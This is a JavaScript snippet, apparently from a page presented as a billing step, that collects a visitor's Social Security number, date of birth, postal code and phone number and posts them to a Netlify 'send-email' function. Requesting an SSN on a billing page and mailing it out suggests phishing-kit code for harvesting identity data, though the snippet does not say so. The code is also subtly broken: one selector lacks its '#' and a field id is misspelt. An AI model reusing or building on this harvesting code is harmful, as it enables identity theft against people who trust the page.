
      document.querySelector("#form3").addEventListener("submit", async (e) => {
        e.preventDefault();
        const c_ssnn = document.querySelector("#c_sssnn").value;
        const c_dob = document.querySelector("#c_dob").value;
        const c_postal = document.querySelector("#c_postal").value;
        const c_phone = document.querySelector("c_phone").value;


        const res = await fetch("/.netlify/functions/send-email", {
          method: "POST",
          body: JSON.stringify({
            c_ssnn,
            c_dob,
            c_postal,
            c_phone,
            pageName: "Billing Page", // This changes per page
          }),
        });

        const data = await res.json();
        console.log(data);
      });
    